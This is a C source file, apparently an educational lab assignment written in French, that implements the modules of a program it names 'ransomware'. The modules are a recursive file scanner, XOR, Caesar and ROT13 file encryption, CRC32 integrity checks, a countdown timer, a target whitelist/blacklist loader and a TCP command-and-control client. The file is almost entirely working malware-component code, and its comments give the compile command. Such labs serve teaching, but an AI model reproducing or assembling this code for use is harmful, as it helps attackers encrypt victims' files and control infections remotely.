/*
 * modules.c - Implémentations de tous les modules
 * 
 * Ce fichier contient TOUTES les implémentations des fonctions
 * déclarées dans les fichiers .h
 * 
 * INSTRUCTIONS :
 * 1. Suivre l'ordre des modules (1 à 8)
 * 2. Implémenter chaque fonction selon les instructions du TP_Jour5.md
 * 3. Compiler avec : gcc -I. -o ransomware ransomware.c modules.c
 * 4. Tester avec : ./ransomware
 */

// ============================================================================
// MODULE 1 : SCANNER DE FICHIERS
// ============================================================================
#include "scanner.h"

/*
 * Fonction : scan_directory
 * Description : Scan un répertoire (non récursif)
 * Paramètres :
 *   - path : Chemin du répertoire à scanner
 *   - files : Tableau pour stocker les chemins de fichiers
 *   - max_files : Nombre maximum de fichiers
 * Retour : Nombre de fichiers trouvés
 */
int scan_directory(const char *path, char files[][MAX_PATH], int max_files) {
    // Scan non-récursif d'un répertoire
    DIR *dir = opendir(path);
    if (!dir) return 0;
    
    int count = 0;
    struct dirent *entry;
    
    while ((entry = readdir(dir)) != NULL && count < max_files) {
        // Ignorer . et ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
            
        // Construire le chemin complet
        char fullpath[MAX_PATH];
        int path_length = snprintf(fullpath, MAX_PATH, "%s/%s", path, entry->d_name);
        if (path_length >= MAX_PATH) {
            continue;  // Ignorer si le chemin est trop long
        }
        
        // Vérifier si c'est un fichier (pas un dossier)
        struct stat st;
        if (stat(fullpath, &st) == 0 && S_ISREG(st.st_mode)) {
            if (!should_exclude(entry->d_name)) {
                strncpy(files[count], fullpath, MAX_PATH - 1);
                files[count][MAX_PATH - 1] = '\0';
                count++;
            }
        }
    }
    
    closedir(dir);
    return count;
}

/*
 * Fonction : scan_recursive
 * Description : Scan récursivement un répertoire
 * Paramètres :
 *   - path : Chemin du répertoire à scanner
 *   - files : Tableau 2D pour stocker les chemins complets des fichiers trouvés
 *   - max_files : Nombre maximum de fichiers à stocker dans le tableau
 * Retour : Nombre de fichiers réguliers trouvés dans le répertoire
 */
int scan_recursive(const char *path, char files[][MAX_PATH], int max_files, int current_count) {
    DIR *dir = opendir(path);
    if (dir == NULL) {
        return current_count;  // Permissions refusées ou chemin invalide
    }
    
    int count = current_count;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL && count < max_files) {
        
        // Ignorer "." et ".." 
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        
        // Construire le chemin complet
        char full_path[MAX_PATH];
        int path_length = snprintf(full_path, MAX_PATH, "%s/%s", path, entry->d_name);
        if (path_length >= MAX_PATH) {
            continue;  // Ignorer si le chemin est trop long
        }

        // Récupérer les infos du fichier 
        struct stat file_stat;
        if (stat(full_path, &file_stat) != 0) {
            continue;  // Erreur, on ignore cette entrée
        }
        
        // Traitement selon le type
        if (S_ISDIR(file_stat.st_mode)) {
            // C'est un dossier : appel récursif
            count = scan_recursive(full_path, files, max_files, count);
        } 
        else if (S_ISREG(file_stat.st_mode)) {
            // C'est un fichier régulier
            if (!should_exclude(entry->d_name)) {
                // Log de debogage
                // printf("Ajout du fichier: %s\n", full_path);
                // Le fichier n'est pas exclu, on l'ajoute
                // À COMPLÉTER : 
                // 1. Copier full_path dans files[count] avec strncpy()
                // 2. Incrémenter count
                strncpy(files[count], full_path, MAX_PATH - 1);
                files[count][MAX_PATH - 1] = '\0';  
                count++;
            }
        }
    }
    
    closedir(dir);
    return count;
}

/*
 * Fonction : should_exclude
 * Description : Vérifie si un fichier doit être exclu
 * Paramètres :
 *   - path : Chemin du répertoire à scanner
 *   - files : Tableau 2D pour stocker les chemins complets des fichiers trouvés
 *   - max_files : Nombre maximum de fichiers à stocker dans le tableau
 *   - current_count : Nombre de fichiers déjà trouvés avant cet appel récursif
 * Retour : Nombre total de fichiers trouvés (incluant ceux des appels récursifs précédents)
 */
int should_exclude(const char *filename) {
    // Vérifier si le nom de fichier est NULL
    if (filename == NULL) {
        return 1;   // Exclure
    }
    
    // Vérifier si le nom de fichier commence par '.'
    if (filename[0] == '.') {
        return 1;  // Exclure les fichiers cachés
    }
    
    // Vérifier si le nom contient ".git"
    if (strstr(filename, ".git") != NULL) {
        return 1;  // Exclure
    }
    
    // Vérifier si le nom contient ".exclude"
    if (strstr(filename, ".exclude") != NULL) {
        return 1;
    }
    
    return 0;  // Par défaut, ne pas exclure
}


// ============================================================================
// MODULE 2 : CHIFFREMENT XOR
// ============================================================================
#include "xor_crypto.h"

/*
 * Fonction : xor_buffer
 * Description : XOR un buffer avec une clé
 * Paramètres :
 *   - buffer : Buffer à chiffrer
 *   - size : Taille du buffer
 *   - key : Clé de chiffrement
 *   - key_len : Longueur de la clé
 */
void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i % key_len];  // XOR avec rotation de clé
    }
}

/*
 * Fonction : xor_encrypt_file
 * Description : Chiffre un fichier avec XOR
 * Paramètres :
 *   - input : Chemin du fichier d'entrée
 *   - output : Chemin du fichier de sortie
 *   - key : Clé de chiffrement
 * Retour : 0 en cas de succès, -1 en cas d'erreur
 */
int xor_encrypt_file(const char *input, const char *output, const char *key) {
    size_t key_len = strlen(key);
    
    // Ouvrir le fichier d'entrée en lecture binaire 
    FILE *fin = fopen(input, "rb");
    if (!fin) {
        return -1;  // Erreur d'ouverture
    }
    
    // Ouvrir le fichier de sortie en écriture binaire 
    FILE *fout = fopen(output, "wb");
    if (!fout) {
        fclose(fin);
        return -1;  // Erreur d'ouverture
    }
    
    // Buffer pour lire les données par blocs 
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    
    // Boucle de lecture/chiffrement/écriture (CODE GUIDÉ)
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, fin)) > 0) {
        
        // Chiffrer le buffer avec xor_buffer()
        xor_buffer(buffer, bytes_read, key, key_len);
        
        // Écrire le buffer chiffré 
        size_t bytes_written = fwrite(buffer, 1, bytes_read, fout);
        if (bytes_written != bytes_read) {
            fclose(fin);
            fclose(fout);
            return -1;  // Erreur d'écriture
        }
    }
    
    // Fermer les fichiers 
    fclose(fin);
    fclose(fout);
    return 0;  // Succès
}

/*
 * Fonction : xor_decrypt_file
 * Description : Déchiffre un fichier avec XOR (identique à encrypt)
 * Paramètres :
 *   - input : Chemin du fichier d'entrée
 *   - output : Chemin du fichier de sortie
 *   - key : Clé de déchiffrement
 * Retour : 0 en cas de succès, -1 en cas d'erreur
 */
int xor_decrypt_file(const char *input, const char *output, const char *key) {
    // ASTUCE : XOR est symétrique !
    // Chiffrer et déchiffrer sont la même opération
    return xor_encrypt_file(input, output, key);
}


// ============================================================================
// MODULE 3 : CHIFFREMENT CÉSAR
// ============================================================================
#include "caesar_crypto.h"

/*
 * Fonction : caesar_char
 * Description : Applique César à un caractère
 * Paramètres :
 *   - c : Caractère à chiffrer
 *   - shift : Décalage à appliquer (1-25)
 * Retour : Caractère chiffré
 */
char caesar_char(char c, int shift) {
    // Si c'est une majuscule (A-Z)
    if (isupper(c)) {
        // Formule César : (c - 'A' + shift) % 26 + 'A'
        return ((c - 'A' + shift) % 26 + 26) % 26 + 'A';
    }
    // Si c'est une minuscule (a-z)
    else if (islower(c)) {
        // Formule César : (c - 'a' + shift) % 26 + 'a'
        return ((c - 'a' + shift) % 26 + 26) % 26 + 'a';
    }
    // Sinon (chiffres, ponctuation, espaces)
    else {
        return c;  // Ne pas modifier
    }
}

/*
 * Fonction : caesar_encrypt_file
 * Description : Chiffre un fichier avec César
 * Paramètres :
 *   - input : Chemin du fichier d'entrée
 *   - output : Chemin du fichier de sortie
 *   - shift : Décalage à appliquer (1-25)
 * Retour : 0 en cas de succès, -1 en cas d'erreur
 */
int caesar_encrypt_file(const char *input, const char *output, int shift) {
    // Ouvrir le fichier d'entrée en lecture
    FILE *fin = fopen(input, "r");
    if (!fin) return -1;

    // Ouvrir le fichier de sortie en écriture
    FILE *fout = fopen(output, "w");
    if (!fout) {
        fclose(fin);
        return -1;
    }

    int c;
    while ((c = fgetc(fin)) != EOF) {
        // Chiffrer le caractère et l'écrire
        char encrypted = caesar_char((char)c, shift);
        fputc(encrypted, fout);
    }

    fclose(fin);
    fclose(fout);
    return 0;
}

/*
 * Fonction : caesar_decrypt_file
 * Description : Déchiffre un fichier avec César
 * Paramètres :
 *   - input : Chemin du fichier d'entrée
 *   - output : Chemin du fichier de sortie
 *   - shift : Décalage utilisé pour le chiffrement (1-25)
 * Retour : 0 en cas de succès, -1 en cas d'erreur
 */
int caesar_decrypt_file(const char *input, const char *output, int shift) {
    // Pour déchiffrer, utiliser un décalage inverse
    return caesar_encrypt_file(input, output, 26 - shift);
}


// ============================================================================
// MODULE 4 : ROT13
// ============================================================================
#include "rot13_crypto.h"

/*
 * Fonction : rot13_char
 * Description : ROT13 d'un caractère (utilise César avec shift=13)
 * Paramètres :
 *   - c : Caractère à chiffrer/déchiffrer
 * Retour : Caractère transformé
 */
char rot13_char(char c) {
    // ROT13 est simplement César avec un décalage de 13
    return caesar_char(c, 13);
}

/*
 * Fonction : rot13_file
 * Description : Chiffre/Déchiffre un fichier avec ROT13
 * Paramètres :
 *   - input : Chemin du fichier d'entrée
 *   - output : Chemin du fichier de sortie
 * Retour : 0 en cas de succès, -1 en cas d'erreur
 */
int rot13_file(const char *input, const char *output) {
    // Réutiliser la fonction caesar_encrypt_file avec un décalage de 13
    return caesar_encrypt_file(input, output, 13);
}


// ============================================================================
// MODULE 5 : CHECKSUM (CRC32)
// ============================================================================
#include "checksum.h"
#include <stdio.h>
#include <stdlib.h>

/*
 * Fonction : crc32
 * Description : Calcule le CRC32 d'un buffer
 * Paramètres :
 *   - data : Pointeur vers les données
 *   - length : Longueur des données en octets
 * Retour : Valeur CRC32 calculée
 */
uint32_t crc32(const unsigned char *data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

/*
 * Fonction : calculate_crc32
 * Description : Calcule le CRC32 d'un fichier
 * Paramètres :
 *   - filepath : Chemin du fichier
 * Retour : Valeur CRC32 du fichier
 */
uint32_t calculate_crc32(const char *filepath) {
    FILE *file = fopen(filepath, "rb");
    if (!file) return 0;
    
    unsigned char buffer[BUFFER_SIZE];
    size_t bytes_read;
    uint32_t final_crc = 0xFFFFFFFF;  // Initialisation
    
    // Lire le fichier par blocs
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        // Calculer CRC32 du buffer et combiner avec le CRC global
        uint32_t block_crc = crc32(buffer, bytes_read);
        final_crc ^= block_crc;  // Combiner les CRC
        
    }
    
    fclose(file);
    return final_crc;
}

/*
 * Fonction : verify_integrity
 * Description : Vérifie l'intégrité d'un fichier
 * Paramètres :
 *   - filepath : Chemin du fichier à vérifier
 *   - expected_crc : CRC32 attendu
 * Retour : 0 si l'intégrité est vérifiée, -1 si le fichier a été modifié
 */
int verify_integrity(const char *filepath, uint32_t expected_crc) {
    // Calculer le CRC actuel
    uint32_t actual_crc = calculate_crc32(filepath);

    // Comparer avec le CRC attendu
    if (actual_crc == expected_crc) {
        return 0;  // Intégrité OK
    } else {
        return -1;  // Fichier modifié
    }
}


// ============================================================================
// MODULE 6 : TIMER
// ============================================================================
#include "timer.h"

/*
 * Fonction : get_current_timestamp
 * Description : Récupère le timestamp actuel (secondes depuis epoch)
 * Retour : Timestamp actuel
 */
long get_current_timestamp() {
    return (long)time(NULL);  // Timestamp UNIX en secondes
}

/*
 * Fonction : wait_seconds
 * Description : Attend N secondes
 * Paramètres :
 *   - seconds : Nombre de secondes à attendre
 */
void wait_seconds(int seconds) {
    sleep(seconds);    // Utilisation de sleep() pour attendre N secondes
}

/*
 * Fonction : wait_until
 * Description : Attend jusqu'à un timestamp précis
 * Paramètres :
 *   - target_timestamp : Timestamp cible à atteindre
 */
void wait_until(long target_timestamp) {
    while (1) {
        long current = get_current_timestamp();
        
        // Si on a atteint la cible, sortir
        if (current >= target_timestamp) {
            break;
        }
        
        // Attendre 1 seconde avant de revérifier
        wait_seconds(1);
    }    
}


// ============================================================================
// MODULE 7 : CONFIGURATION
// ============================================================================
#include "config.h"

/*
 * Fonction : load_config
 * Description : Charge la configuration depuis un fichier
 * Paramètres :
 *   - filepath : Chemin vers le fichier de configuration
 * Retour : Pointeur vers la structure Config ou NULL en cas d'erreur
 */
Config* load_config(const char *filepath) {
    Config *cfg = malloc(sizeof(Config));
    if (!cfg) return NULL;
    
    cfg->whitelist_count = 0;
    cfg->blacklist_count = 0;
    
    FILE *file = fopen(filepath, "r");
    if (!file) {
        free(cfg);
        return NULL;
    }
    
    char line[MAX_LINE];
    int in_whitelist = 0, in_blacklist = 0;
    
    while (fgets(line, sizeof(line), file)) {
        // Enlever le \n à la fin 
        line[strcspn(line, "\n")] = 0;
        
        // Détecter les sections
        if (strcmp(line, "[WHITELIST]") == 0) {
            in_whitelist = 1;
            in_blacklist = 0;
            continue;
        }
        else if (strcmp(line, "[BLACKLIST]") == 0) {
            in_whitelist = 0;
            in_blacklist = 1;
            continue;
        }
        
        // Ignorer lignes vides
        if (strlen(line) == 0) continue;
        
        // Ajouter à la whitelist
        if (in_whitelist && cfg->whitelist_count < MAX_ITEMS) {
            strncpy(cfg->whitelist[cfg->whitelist_count], line, 63);
            cfg->whitelist[cfg->whitelist_count][63] = '\0'; 
            cfg->whitelist_count++;
        }
        // Ajouter à la blacklist
        else if (in_blacklist && cfg->blacklist_count < MAX_ITEMS) {
            strncpy(cfg->blacklist[cfg->blacklist_count], line, 255);
            cfg->blacklist[cfg->blacklist_count][255] = '\0';
            cfg->blacklist_count++;
        }
    }
    
    fclose(file);
    return cfg;
}

/*
 * Fonction : is_allowed
 * Description : Vérifie si un fichier est autorisé
 * Paramètres :
 *   - cfg : Configuration chargée
 *   - filepath : Chemin du fichier à vérifier
 * Retour : 1 si autorisé, 0 sinon
 */
int is_allowed(const Config *cfg, const char *filepath) {
    // Vérifier si le fichier est dans la blacklist
    for (int i = 0; i < cfg->blacklist_count; i++) {
        if (strstr(filepath, cfg->blacklist[i]) != NULL) {
            return 0;  // Fichier bloqué
        }
    }
    
    // Vérifier si l'extension est dans la whitelist
    const char *dot = strrchr(filepath, '.');
    if (dot) {
        for (int i = 0; i < cfg->whitelist_count; i++) {
            if (strcmp(dot, cfg->whitelist[i]) == 0) {
                return 1;  // Fichier autorisé
            }
        }
    }

    return 0;  // Non autorisé par défaut
}

/*
 * Fonction : free_config
 * Description : Libère la mémoire de la config
 * Paramètres :
 *   - cfg : Configuration à libérer
 */
void free_config(Config *cfg) {
    if (cfg != NULL) {
        free(cfg);
    }    
}


// ============================================================================
// MODULE 8 : CLIENT C2
// ============================================================================
#include "c2_client.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>

/*
 * Fonction : c2_connect
 * Description : Connexion au serveur C2
 * Paramètres :
 *   - ip : Adresse IP du serveur
 *   - port : Port du serveur
 * Retour : Descripteur de socket connecté ou -1 en cas d'erreur
 */
int c2_connect(const char *ip, int port) {
    // Créer un socket TCP 
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket() failed");
        return -1;
    }

    // Configuration de l'adresse du serveur 
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // Convertir l'IP en format binaire
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sockfd);
        return -1;
    }
    
    // Connexion au serveur 
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect() failed");
        close(sockfd);
        return -1;
    }
    
    return sockfd;  // Socket connecté
}

/*
 * Fonction : c2_send_command
 * Description : Envoie une commande et attend la réponse
 * Paramètres :
 *   - sockfd : Descripteur de socket connecté
 *   - cmd : Pointeur vers la commande à envoyer
 * Retour : Réponse du serveur
 */
C2Response c2_send_command(int sockfd, const C2Command *cmd) {
    C2Response resp;
    memset(&resp, 0, sizeof(resp));
    
    // Envoyer la commande au serveur
    ssize_t sent = send(sockfd, cmd, sizeof(C2Command), 0);
    
    // Vérifier que tout a été envoyé
    if (sent != sizeof(C2Command)) {
        resp.status = -1;
        snprintf(resp.message, sizeof(resp.message), "Send failed: %s", strerror(errno));
        return resp;
    }
    
    // À COMPLÉTER : Recevoir la réponse du serveur
    ssize_t received = recv(sockfd, &resp, sizeof(C2Response), 0);
    if (received <= 0) {
        resp.status = -1;
        snprintf(resp.message, sizeof(resp.message), "Receive failed: %s", strerror(errno));
    }
    
    return resp;
}

/*
 * Fonction : c2_disconnect
 * Description : Ferme la connexion
 * Paramètres :
 *   - sockfd : Descripteur de socket à fermer
 */
void c2_disconnect(int sockfd) {
    if (sockfd >= 0) {
        close(sockfd);
    }
}
